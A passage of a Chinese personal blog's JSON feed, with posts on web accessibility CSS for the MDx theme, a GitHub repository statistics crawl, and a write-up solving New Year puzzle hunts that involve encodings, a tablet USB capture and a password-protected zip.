data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了…），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 Fork</div>\n<div>\n<span>6.59%</span><br>的账户被删除或<br>封禁<sup>1</sup>\n</div>\n<div>\n<span>23,913</span><br>单用户拥有最大<br>库数量<sup>2</sup>\n</div>\n</div>\n</div>\n<p><sup>1</sup> 基于用户 ID 规律合理推断<br><sup>2</sup> 统计范围仅限于当前数据集</p>\n<p>比较出乎我意料的是创建自 Fork 的存储库的占比。我预估这样的存储库占比不会太低，但没有想到能接近一半。此外单用户拥有最大库数量也大大超出了我的预期，<a href=\"https://github.com/pombredanne\" rel=\"noopener noreferrer\" target=\"_blank\">pombredanne</a> 这个用户名下拥有将近 24k 的存储库，不过绝大多数都是 Fork 来的，在情理之中。此外<strong>这个数据集中</strong>拥有最多存储库的账户其实是一个组织 <a href=\"https://github.com/gitpan\" rel=\"noopener noreferrer\" target=\"_blank\">gitpan</a>，这个组织拥有 36,377 个存储库。</p>\n<h2>语言</h2>\n<p><canvas></canvas><br>\n首先必须要说明的是，在这个榜单中我<strong>排除了 HTML 和 CSS</strong>，因为在严格意义上它们不属于“编程语言”。如果把它们计算进来的话，分别有 640,368 个和 361,425 个存储库的主要语言分别是 HTML 和 CSS，这样在这份榜单中它们可以排到第 6 和 第 10 名。JavaScript 毫无疑问获得第一，第二名 Python 的热度则和 JavaScript 相差将近一半。<strong>此外还有 2,448,486 个存储库未能识别出语言，占比 16.7%。</strong>在上面的榜单之外，与机器学习和数据科学相关的语言还有 Jupyter Notebook 排名第 13，R 排名 20，Julia 排名 43。</p>\n<p>说实话这份排名和 GitHub 官方的排名<strong>差别很大</strong>，除了前三名，后面的基本都不太一样。我的排名统计结果完全基于 GitHub 对于存储库的主要语言识别，加上我的存储库数据不完整，和官方的数据不同是很正常的，可以做一个参考，但大概率还是官方排名更加准确。</p>\n<h2>许可证</h2>\n<p><canvas></canvas></p>\n<p>自 GitHub 推出许可证功能以来，拥有许可证的存储库比例升升降降，却始终没有超过一半。<strong>选择一个合适的许可证对项目的良好发展真的很有帮助</strong>，要了解如何选择合适的许可证，请参阅<a href=\"https://www.runoob.com/w3cnote/open-source-license.html\" rel=\"noopener noreferrer\" target=\"_blank\">这篇文章</a>。</p>\n<p><canvas></canvas></p>\n<p>对于拥有许可证的存储库，MIT<del> 麻省理工许可证 </del>总是占比最大的；第二则是 Apache-2.0 许可证。此外，WTFPL 许可证也挤入了前 15 名。</p>\n<h2>星标</h2>\n<p><canvas></canvas><br>\nStar 数量毫无疑问是一个存储库受欢迎程度的体现，而 Star 数高的项目基本上大家都了解过。<strong>截至爬取结束时间</strong>，GitHub 中 Star 数最多的库是 <a href=\"https://github.com/freeCodeCamp/freeCodeCamp\" rel=\"noopener noreferrer\" target=\"_blank\">freeCodeCamp</a> <del>非常完美的驼峰命名法</del>，其次则是著名项目 <a href=\"https://github.com/996icu/996.ICU\" rel=\"noopener noreferrer\" target=\"_blank\">996.ICU</a>。<a href=\"https://github.com/vuejs/vue\" rel=\"noopener noreferrer\" target=\"_blank\">Vue</a> 现在的 Star 数已经稳压 <a href=\"https://github.com/facebook/react\" rel=\"noopener noreferrer\" target=\"_blank\">React</a> 一头，Vue YES! 此外 <a href=\"https://github.com/sindresorhus/awesome\" rel=\"noopener noreferrer\" target=\"_blank\">awesome</a> 也挤进第七名。<br><canvas></canvas><br>\n由于 Star 需要时间积累，新项目的 Star 数量很可能是比不过老项目的，这就会导致有实力的新项目无法出现在榜单中。因此我还统计了日均 Star 数，试图通过日均 Star 数来反映项目受欢迎的程度。<strong>由于正热门的项目会比老牌热门项目有优势，这一项的统计范围是 2020-01-01 之前的所有存储库。</strong>996.ICU 和 freeCodeCamp 再次出现在前 10 名，而最近的热门项目 <a href=\"https://github.com/wenyan-lang/wenyan\" rel=\"noopener noreferrer\" target=\"_blank\">wenyan</a> 则飙升至第 2 名。此外还有 <a href=\"https://github.com/menzi11/BullshitGenerator\" rel=\"noopener noreferrer\" target=\"_blank\">BullshitGenerator</a>，即最近热门的“狗屁不通文章生成器”和 <a href=\"https://github.com/evil-huawei/evil-huawei\" rel=\"noopener noreferrer\" target=\"_blank\">evil-huawei</a> 分列第 3 和第 5 名。<br><canvas></canvas><br>\n说实话这个曲线<strong>比我预估的陡多了。</strong>你可能已经注意到了，这个图表的横轴不是均匀缩放的，实际上曲线要比看起来陡很多。同时受爬取方式的影响，GitHub 中 Star 数较少的存储库数量远比我爬取到的多。也就是说，<strong>实际情况下曲线远比这个图表上的陡。</strong>拿点 Star 不容易啊。</p>\n<h2>名称</h2>\n<p><canvas></canvas><br>\n终于知道了原来存储库的名称是有长度限制的…尽管最长有 100 位，<strong>大部分人还是喜欢 8 位长的存储库名。</strong>此外 1 位长的名称也比我预估的要多一些。举几个存储库名称长度为 100 的例子吧。</p>\n<ul>\n<li>testing-something-elsetesting-something-elsetesting-something-elsetesting-something-elsetesting-some</li>\n<li>acts_as_validated_config_so_app_will_not_run_in_random_situation_and_qa_gays_will_not_cry_to_you_whe</li>\n<li>……………………………………..________-………………………………-.—……</li>\n<li>—————————————————————————————————-</li>\n<li>nyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyannyan</li>\n</ul>\n<p>…创造力有够丰富的。</p>\n<p><canvas></canvas></p>\n<p>最近 GitHub 上有一种奇怪的风气，那就是建立 Awesome 合集<del>骗 Star</del>。看起来 Awesome 存储库满地都是，甚至还出现了关于 Awesome 的 Awesome 合集这种迷惑行为。于是我统计了一下，<del>还好，</del>占比<del>才</del> 0.5% 不到<del>，Awesomer 们任重而道远呐</del>。</p>\n<p><canvas></canvas></p>\n<p>尽管要在 github.io 上托管网站，存储库不一定要以 .github.io 结尾，但我还是统计了一下。拥有这类存储库的用户比我预想的要少一些，看来还有很多人没有完全发挥 GitHub 的完整实力啊<del>（比如我 Doge）</del>。同时<strong>这类存储库在所有存储库中占比 1.12%</strong>，看起来不多<del>，不过至少比 Awesome 多</del>。<br><canvas></canvas><br>\n看得出来 GitHub 对于用户名长度的限制是 1-40 位。用户名最短的 27 位占据了 <code>A-Z</code> 外加 <code>-</code> 的所有可能，而用户名最长的则是一个组织 <a href=\"https://github.com/UOIT-RESEARCH-database-information-group\" rel=\"noopener noreferrer\" target=\"_blank\">UOIT-RESEARCH-database-information-group</a>。不知道是巧合还是某种规律，<strong>最受欢迎的用户名长度和存储库名称长度一样，都是 8</strong>，有点意思。</p>\n<h2>创建时间</h2>\n<p><canvas></canvas><br>\n由于我并没有完整爬取所有存储库，我只能以相对值来统计每月新增存储库数量的变化趋势。<strong>在这个图表中，我将 2017-09 的数据设为了 100%。</strong>你一定一眼就能注意到 2017 年 6,7,8 月的“一柱擎天”。<del datetime=\"2020-02-05T09:18:30+00:00\">我第一次看到这个数据的时候的确愣了一下，不过就着这条新闻看就能明白为什么了：<strong>2017 年 6 月微软收购 GitHub。</strong></del></p>\n<blockquote><p>重新确认了一下，微软收购 GitHub 比这个高峰晚了一年，目前我对这个高峰没有什么很好的解释，如果你有什么思路的话欢迎评论。</p></blockquote>\n<p><strong>需要注意的是这张图表中我排除了 Fork 存储库</strong>，因为 Fork 存储库在 API 中的创建时间是原始存储库的时间，会影响整体趋势。此外，GitHub 中还有一个创建于 2007 年 10 月 29 日的存储库，那就是 <code>id: 1</code> 的…</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"mojombo\" data-mdxgithubp=\"grit\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/mojombo/grit\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>而它的创建者正是 GitHub 的创始人之一 Tom Preston-Werner。</p>\n<h1>一些有趣的结果</h1>\n<p>当初打算自己爬的目的之一就是想看看能不能挖出什么有意思的信息，结果真的有一些不挖不知道的信息。</p>\n<h2>奇怪的存储库</h2>\n<p>在爬取到的所有存储库中，<strong>有 3 个存储库是“无主”的</strong>，即它们的 owner 属性为空。这三个存储库的基本信息如下。</p>\n<div class=\"mdui-table-fluid mdui-table-hoverable\"><table class=\"mdui-table\">\n<thead><tr>\n<th>ID</th>\n<th>名称</th>\n<th>Forked</th>\n<th>Star</th>\n<th>语言</th>\n<th>许可证</th>\n<th>创建于</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>72385291</td>\n<td>vscode-redprl</td>\n<td>否</td>\n<td>10</td>\n<td>TypeScript</td>\n<td>apache-2.0</td>\n<td>2016-10-31 08:50:01</td>\n</tr>\n<tr>\n<td>181218346</td>\n<td>electron-sys</td>\n<td>否</td>\n<td>10</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-14 03:20:56</td>\n</tr>\n<tr>\n<td>181391880</td>\n<td>node-sys</td>\n<td>否</td>\n<td>6</td>\n<td>Rust</td>\n<td>other</td>\n<td>2019-04-15 09:33:08</td>\n</tr>\n</tbody>\n</table></div>\n<p><strong>更奇怪的是这三个存储库“无主”的情况还不一样。</strong>第一个存储库可以通过 <code>/repositories</code> 这个 GitHub API 找到， <a href=\"https://api.github.com/repositories?since=72385290\" target=\"_blank\" rel=\"noopener noreferrer\">这个链接</a>中的第一个存储库就是它；而其余两个存储库甚至无法在 <code>/repositories</code> API 中找到。不过就算能在 API 中找到第一个存储库，它的 <code>html_url</code>，即 <code>https://github.com//vscode-redprl</code> 仍然是不可访问的。这可能是 GitHub 早期的一个 Bug 导致的，不过我仍然对爬虫是如何找到这三个存储库的以及这些 Stars 是哪里来的感到好奇。</p>\n<h2>奇怪的用户名</h2>\n<p>在爬虫爬了一段时间以后，API 中突然开始出现大量的以 fdp 开头的 18 位乱码作为用户名的用户。这些用户拥有的存储库和 starred 的存储库都为 0，而他们的 <code>html_url</code> 为 404。以下是几个例子。</p>\n<ul>\n<li>fdpEpolGCEdQX4ZlRJ</li>\n<li>fdp8XaVrdtmDZnO5pR</li>\n<li>fdp8XRAGnwAOkTr2Ya</li>\n</ul>\n<p>由于我的爬虫并没有超过 Rate Limit，所以我排除了这是污染数据的可能。我怀疑这可能是某种 Bot 账户，于是一边更新爬虫过滤掉了这些用户，一边给 GitHub 支持发邮件问了具体情况。过了两天 GitHub 回复我说这些是<strong>被自动判为可疑进而被封禁的用户</strong>（原话是 they have been flagged by our automated measures for detecting suspicious behavior）。<del>想到我正在疯狂爬取 GitHub，突然害怕.webp</del></p>\n<p>行吧。</p>\n<h1>技术细节</h1>\n<p>爬虫使用 Python3 编写，数据库使用 MySQL。爬虫共使用了 4 个 API Token，在两台服务器上分布式爬取。爬取思路为：</p>\n<ol>\n<li>通过 <code>/users</code> API 遍历用户，每个请求最多获取 30 个用户信息</li>\n<li>循环 30 个用户，分别获取 <code>/users/&lt;user_name&gt;/starred</code> 和 <code>/users/&lt;user_name&gt;/repos</code> API 中的存储库信息，每个请求最多获取 100 个存储库信息，超过 100 个的分页获取</li>\n<li>提取存储库信息，插入数据库。对于已存在的存储库，更新数据</li>\n<li>获取下 30 个用户信息</li>\n</ol>\n<p>由于爬取过程中我多次调整了爬虫逻辑，爬虫爬取到的用户 ID 区间并非连续的，具体区间为1-839586, 14800001-14885493 及 28965251-31161101。</p>\n<h1>免责声明</h1>\n<p>本站会尽可能地提供准确信息，但本站不对此文章中信息的准确性和即时性及带来的任何影响负责。</p>\n<p>本站不代表 GitHub 官方，本文仅供学习之用，请不要将本文内容直接用于任何商业项目中。</p>\n<h1>数据集下载</h1>\n<p>导出的 SQL 文件大约为 1.38GB，全部放在了 GitHub 上（在危险的边缘试探.webp</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"github-analysis-2019\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/github-analysis-2019\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>此外我也提供了 MEGA 下载，链接<a href=\"https://mega.nz/#F!juxm3A6T!7Vwpzi82W1OFrqTLu1A1pQ\">在这里</a>。</p>\n","link":"https://flyhigher.top/develop/1564.html"},{"title":"Milkice 跨年红包解谜 Writeup 及无垠跨年红包解谜答案","date":"2020-01-02 04:29:19","description":"\n<blockquote><p><del>又到了水文章的时间呢</del></p></blockquote>\n<p>先说明一下，这篇文章原本不是在计划中的，而原来说好的「在路上的两篇」文章<del>绝对不会咕</del>。我自己的红包答案本来打算直接塞在年度总结里的，结果发现稍微有些长，再加上我还花了一些时间解了<a href=\"https://milkice.me/\">奶冰</a>的红包解谜游戏，就打算把两个解谜过程放在一起单独写一篇文章。<del>真是个水文章的好理由</del>（被打死</p>\n<h1>奶<del> 子 </del>冰的红包</h1>\n<p>奶冰的红包题目比我的难多了，所以让我们先从难的开始吧。首先看一下<a href=\"https://milkice.me/2019/12/31/2019-summary/\">题目</a>：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1524\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-2.jpg\" alt=\"\" width=\"746\" height=\"410\"></a>\n<p>入口是 <code>happy.2020.milkice.me</code>，扔到浏览器里面表示找不到 IP，那么大概率就是 DNS 的 TXT 记录了，查一下得到 <code>nb2hi4dthixs63ljnrvwsy3ffzwwkl3tivrvezluomxxg5dsmvqw2ltqmnqxa3th</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1525\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-3.jpg\" alt=\"\" width=\"896\" height=\"278\"></a>\n<p>第一眼没看出来是什么编码，直觉是 BaseXX 系列的编码，加上提示“不只有 Base64”，可以推断出是 Base32，转大写解码得到 <code>https://milkice.me/sEcRets/stream.pcapng</code>。是个 URL，下载得到一个 Wireshark 文件，打开一看是和某 USB 设备的通讯抓包。<del>不会做，不做了。</del></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1526\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-4.jpg\" alt=\"\" width=\"1500\" height=\"813\"></a>\n<p>奶冰提示我“Google 上搜得到”，结合第二条提示搜索“wacom pcapng”找到了<a href=\"https://blogs.tunelko.com/2017/02/05/bitsctf-tom-and-jerry-50-points/\">这篇文章</a>（<del>这™就是答案啊</del>）。看起来是一样的套路，即通过解析数据得到数位板上画的内容，于是按文章的思路筛选出数位板发给主机的数据，导出，然后再用 tshark 导出文本数据。本来我想直接用文章中的 POC 的，结果折腾半天因为源的蜜汁原因库没装上，于是按文章中给出的数据结构自己写了段代码，分别导出 X、Y 轴数据扔进 Excel 画散点图。（<del>别问我为什么用 Excel，因为我手边没有更好的工具了</del>）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1528\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8.jpg\" alt=\"\" width=\"1280\" height=\"530\"></a>\n<p><span>翻车现场之一</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1539\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-13.jpg\" alt=\"\" width=\"1000\" height=\"286\"></a>\n<p><span>懵逼奶冰.webp</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1533\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-1.jpg\" alt=\"\" width=\"1500\" height=\"462\"></a>\n<p>看得出有手写文字，不过是上下颠倒的，翻转图片得 <code>https://milkice.me/2020/uso.zip</code>。是个 zip，下载打开一看，有密码。<del>不会解，不做了。</del> 第一反应是暴力解密码，但是暴力跑了 15 分钟还是没有跑出来。暴力太不优雅了，肯定不是正确思路，但奶冰什么都不肯说了。不过在这时我终于发现第一个红包口令码就藏在压缩包的注释中，Get。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1544\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-15.jpg\" alt=\"\" width=\"806\" height=\"593\"></a>\n<p>然而题还没解完，回去看提示，看到提供了 osu 谱面下载，于是打算不管怎么样先下载来看看。然而 osu 谱面下载要登录，只好又花了几分钟找到第三方站点，成功下载。这时候可以注意到 uso.zip 里有个同名文件（432314 Mike Greene – Bill Nye the Science Guy Theme Song (Chinese Intro).osz），可以联想到是明文攻击。好吧，上 ARCHPR，十秒解出。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1530\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-5.jpg\" alt=\"\" width=\"462\" height=\"643\"></a>\n<p><span>现场还原.jpg</span></p>\n<p>.osz 文件并不是明文，猜测是压缩包（和 .pptx 一个思路嘛），于是改后缀 .zip 顺利打开。然后红包口令码就藏在奶冰的 .osu 文件中了，由提示可知是明文，打开即可得到。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 